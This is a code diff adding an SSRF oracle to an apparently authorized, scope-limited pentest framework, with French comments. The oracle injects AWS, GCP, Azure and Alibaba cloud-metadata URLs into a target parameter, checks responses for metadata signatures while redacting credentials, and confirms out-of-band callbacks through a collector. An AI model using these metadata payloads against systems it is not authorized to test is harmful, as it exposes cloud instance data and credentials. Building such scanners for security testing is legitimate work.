@@ -278,3 +278,192 @@ class SsrfXspa(ScopeGuardedOracle):
             poc=(f"# injecter {param}=http://{internal_host}:<PORT>/ dans {action.target} et comparer la "
                  f"réponse (reflet neutralisé) / timing au port fermé {_XSPA_CLOSED_PORT} ; "
                  f"# PREUVE = différentiel prouvant la joignabilité interne (ports={reachable or '—'})"))]
+
+
+# =================================================================================================
+#  ssrf.cloud_metadata — SSRF vers les ENDPOINTS DE MÉTADONNÉES CLOUD (AWS/GCP/Azure IMDS) à PREUVE
+#  BÉNIGNE (T1190 / CWE-918), scope-lockée, NON DESTRUCTIVE. On sonde via un paramètre SSRF-able de la
+#  cible IN-SCOPE si le serveur atteint le service de métadonnées lien-local (169.254.169.254 /
+#  metadata.google.internal) — deux canaux de PREUVE, chacun bénin :
+#    (A) IN-BAND : la réponse REFLÈTE une SIGNATURE de contenu de métadonnées (ex `ami-id`, `azEnvironment`,
+#        l'index GCP `instance/`+`project/`) — après NEUTRALISATION du reflet de l'URL injectée (un simple
+#        echo de l'URL ne suffit jamais). On ne cible QUE les chemins INDEX/non-secrets ; toute valeur de
+#        credential est RÉDIGÉE. PREUVE forte -> `vulnerable` CRITICAL (données de métadonnées atteintes).
+#    (B) OUT-OF-BAND (collecteur) : comme ssrf.callback, on injecte une URL de callback UNIQUE et on
+#        confirme sa réception côté collecteur contrôlé par l'opérateur. Réception = SSRF vers une URL
+#        arbitraire CONFIRMÉE hors-bande (donc la plage lien-local des métadonnées est joignable) ->
+#        `vulnerable` HIGH. Ce n'est PAS un « SSRF aveugle » : le collecteur a VU la requête (preuve concrète).
+#  NOUS ne requêtons que `action.target` (in-scope) ; c'est le SERVEUR qui va chercher l'URL métadonnées/
+#  collecteur — le scope-guard porte sur `action.target`. exploit=False (vérification bénigne : chemins
+#  index non-secrets, valeurs rédigées), destructive=False.
+# =================================================================================================
+# (provider, url_metadata, (marqueurs de CONTENU distinctifs — jamais dans l'URL injectée), min_hits)
+_METADATA_PROBES = [
+    ("AWS", "http://169.254.169.254/latest/meta-data/",
+     ("ami-id", "instance-id", "reservation-id", "security-groups", "public-keys", "instance-type",
+      "local-ipv4", "iam/"), 2),
+    ("GCP", "http://metadata.google.internal/computeMetadata/v1/",
+     ("instance/", "project/", "cpuplatform", "machinetype", "serviceaccounts", "numericprojectid"), 2),
+    ("GCP-linklocal", "http://169.254.169.254/computeMetadata/v1/",
+     ("instance/", "project/", "cpuplatform", "machinetype", "serviceaccounts", "numericprojectid"), 2),
+    ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+     ("azenvironment", "vmid", "subscriptionid", "resourcegroupname", "osprofile"), 2),
+    ("Alibaba", "http://100.100.200.200/latest/meta-data/",
+     ("instance-id", "region-id", "zone-id", "image-id"), 2),
+]
+# valeurs de credential susceptibles d'apparaître dans une réponse de métadonnées -> RÉDIGÉES de l'evidence.
+_META_SECRET_RX = re.compile(
+    r'(?i)("?(?:accesskeyid|secretaccesskey|access_key|secret_key|token|sessiontoken|private_key|'
+    r'client_secret)"?\s*[:=]\s*)"?[A-Za-z0-9._\-+/=]{6,}"?')
+
+
+def _redact_metadata(body):
+    """Masque toute valeur de credential d'une réponse de métadonnées (AccessKeyId/Token/private_key…).
+    Pur, ne lève jamais : l'evidence prouve l'atteinte SANS restituer un credential."""
+    return _META_SECRET_RX.sub(r'\1<redacted-credential>', str(body or ""))
+
+
+@register("ssrf.cloud_metadata")
+class SsrfCloudMetadata(ScopeGuardedOracle):
+    kind = "ssrf.cloud_metadata"
+    exploit = False                      # vérification bénigne (chemins index non-secrets, valeurs rédigées)
+    destructive = False                  # lecture/observation seule : aucune mutation d'état
+    web_allowed = True                   # interaction web (réseau) -> gardée par le ROE
+    available = True                     # urllib stdlib
+    mitre = techniques.mitre_for("ssrf.cloud_metadata")   # source de vérité : techniques.py (T1190)
+    cwe = "CWE-918"                                        # category + cwe des findings
+    tool = "forge/modules/ssrf.py:ssrf.cloud_metadata"
+    fix = ("Allowlist stricte des hôtes/schemas côté serveur ; BLOQUER la plage lien-local et les "
+           "endpoints de métadonnées cloud (169.254.169.254, metadata.google.internal, 100.100.200.200) ; "
+           "résoudre puis re-valider l'IP avant connexion (anti-DNS-rebinding), désactiver le suivi de "
+           "redirection, et exiger IMDSv2 (jeton) côté AWS — un fetch côté serveur ne doit jamais pouvoir "
+           "atteindre le service de métadonnées (CWE-918).")
+    description = ("Oracle SSRF vers les métadonnées cloud (AWS/GCP/Azure IMDS) à PREUVE BÉNIGNE : "
+                   "signature de contenu métadonnées in-band (reflet neutralisé, credential rédigé) OU "
+                   "callback collecteur out-of-band confirmé. Scope-locké. Sinon tested. CWE-918.")
+
+    @staticmethod
+    def _fetch(url, headers=None, timeout=10, method="GET", data=None):
+        """(status, body) — adosse le câblage urllib partagé (Oracle._http). Seam monkeypatché par les tests."""
+        st, body, _ = Oracle._http(url, headers=headers, timeout=timeout, method=method, data=data, maxlen=100000)
+        return st, body
+
+    @staticmethod
+    def _token(target, param):
+        """Jeton de callback déterministe-par-cible (reproductible, distinctif) — mirroir de ssrf.callback."""
+        import hashlib
+        return "forgemeta" + hashlib.sha1(f"{target}|{param}".encode()).hexdigest()[:16]
+
+    def _inject(self, action, param, injected_url, method, headers, timeout):
+        """Injecte `injected_url` dans le paramètre SSRF-able et renvoie (status, body). NOUS ne requêtons
+        que action.target (in-scope) ; l'URL métadonnées/collecteur est fetchée PAR LE SERVEUR."""
+        if method == "GET":
+            sep = "&" if "?" in action.target else "?"
+            url = f"{action.target}{sep}{urllib.parse.urlencode({param: injected_url})}"
+            return self._fetch(url, headers=headers, method="GET", timeout=timeout)
+        return self._fetch(action.target, headers=headers, method=method,
+                           data=urllib.parse.urlencode({param: injected_url}), timeout=timeout)
+
+    @staticmethod
+    def _signature_hit(body, injected_url, markers, min_hits):
+        """(True, [marqueurs vus]) si >= min_hits marqueurs de CONTENU métadonnées apparaissent dans le
+        corps APRÈS NEUTRALISATION du reflet de l'URL injectée (un echo de l'URL ne compte jamais). Pur."""
+        b = (body or "").replace(injected_url, "<INJ>")
+        low = b.lower()
+        seen = [m for m in markers if m in low]
+        return (len(seen) >= min_hits), seen
+
+    def dry(self, action):
+        param = action.params.get("param", "?")
+        return (f"# injecte {param}=http://169.254.169.254/… (AWS/GCP/Azure IMDS) dans {action.target} ; "
+                f"PREUVE (A) in-band = signature de contenu métadonnées réfléchie (reflet NEUTRALISÉ, "
+                f"credential RÉDIGÉ) OU (B) out-of-band = callback collecteur confirmé ; scope-locké, "
+                f"bénin (chemins index non-secrets) ; sinon tested")
+
+    def fire(self, action):
+        # (1) SCOPE-GUARD fail-closed sur la cible SSRF-able — hors périmètre -> skipped, AUCUN réseau.
+        if not self._in_scope(action, action.target):
+            return [self._scope_refused(action)]
+        param = action.params.get("param")
+        if not param:
+            return [self.skip(
+                target=action.target, title="SSRF cloud-metadata non testé — config manquante",
+                evidence=("Requiert params.param (paramètre SSRF-able). Optionnel : params.method, "
+                          "params.headers, params.providers (sous-ensemble AWS/GCP/Azure/Alibaba), et "
+                          "params.callback_base + params.callback_check_url (preuve out-of-band collecteur)."),
+                poc=self.dry(action))]
+        method = str(action.params.get("method", "GET")).upper()
+        headers = dict(action.params.get("headers", {}))
+        try:
+            timeout = max(1, min(int(action.params.get("timeout") or 10), 30))
+        except (TypeError, ValueError):
+            timeout = 10
+        providers = action.params.get("providers")
+        probes = [p for p in _METADATA_PROBES
+                  if (not providers or p[0].split("-")[0] in providers)]
+
+        # --- (A) IN-BAND : signature de contenu métadonnées (reflet NEUTRALISÉ) ---
+        seen_network, hits = False, []
+        for prov, meta_url, markers, min_hits in probes:
+            st, body = self._inject(action, param, meta_url, method, headers, timeout)
+            if st is not None:
+                seen_network = True
+            ok, seen = self._signature_hit(body, meta_url, markers, min_hits)
+            if ok:
+                hits.append((prov, meta_url, seen, _redact_metadata(body)[:400]))
+        if hits:
+            prov, meta_url, seen, snippet = hits[0]
+            return [self.proof(
+                target=action.target, proven=True,
+                title=f"SSRF cloud-metadata CONFIRMÉ — {prov} IMDS atteint (signature in-band, credential rédigé)",
+                severity="CRITICAL",
+                evidence=(f"cible SSRF-able={action.target} ; provider={prov} ; url_injectée={meta_url} ; "
+                          f"marqueurs de contenu métadonnées (reflet NEUTRALISÉ)={seen} ; extrait RÉDIGÉ="
+                          f"{snippet} ; chemin INDEX non-secret sondé, credential(s) RÉDIGÉ(S) ; non destructif"),
+                poc=(f"# injecter {param}={meta_url} dans {action.target} ; "
+                     f"# PREUVE = signature de contenu métadonnées {seen} dans la réponse (reflet neutralisé)"))]
+
+        # --- (B) OUT-OF-BAND : callback collecteur (mirroir ssrf.callback) ---
+        cb_base = action.params.get("callback_base")
+        check_url = action.params.get("callback_check_url")
+        if cb_base and check_url:
+            token = self._token(action.target, param)
+            cb_url = f"{str(cb_base).rstrip('/')}/{token}"
+            st, _ = self._inject(action, param, cb_url, method, headers, timeout)
+            if st is not None:
+                seen_network = True
+            cs, cbody = self._fetch(check_url, timeout=action.params.get("callback_timeout", 15))
+            if cs is not None:
+                seen_network = True
+            received = (cs == 200 and token in (cbody or ""))
+            if received:
+                return [self.proof(
+                    target=action.target, proven=True,
+                    title=("SSRF cloud-metadata CONFIRMÉ — callback out-of-band reçu (SSRF vers URL "
+                           "arbitraire ; plage lien-local métadonnées joignable)"),
+                    severity="HIGH",
+                    evidence=(f"cible SSRF-able={action.target} ; callback={cb_url} ; collecteur HTTP {cs} ; "
+                              f"token_reçu=True (token={token}) — SSRF confirmé HORS-BANDE (non aveugle : le "
+                              f"collecteur a VU la requête) ; la plage lien-local (169.254.169.254) est donc "
+                              f"joignable par le serveur ; non destructif"),
+                    poc=(f"# 1) injecter {param}={cb_url} dans {action.target}\n"
+                         f"# 2) curl -sS '{check_url}'  # chercher le token {token}"))]
+
+        # (4) DÉGRADATION GRACIEUSE — aucune réponse (réseau indisponible) -> skipped (offline-safe).
+        if not seen_network:
+            return [self.degraded(
+                target=action.target,
+                title="SSRF cloud-metadata non testé — réseau indisponible (dégradation gracieuse)",
+                evidence="Aucune réponse du serveur (transport indisponible) sur les sondes métadonnées ; offline-safe.",
+                poc=self.dry(action))]
+
+        # Réseau vu mais ni signature in-band ni callback -> pas de verdict aveugle.
+        return [self.proof(
+            target=action.target, proven=False,
+            title="SSRF cloud-metadata non confirmé — aucune signature métadonnées ni callback (pas de verdict aveugle)",
+            severity="INFO",
+            evidence=(f"cible SSRF-able={action.target} ; providers sondés={[p[0] for p in probes]} ; aucune "
+                      f"signature de contenu métadonnées in-band (reflet neutralisé) et "
+                      f"{'aucun callback reçu' if (cb_base and check_url) else 'pas de collecteur configuré'} ; "
+                      f"non destructif, chemins index non-secrets uniquement"),
+            poc=self.dry(action))]
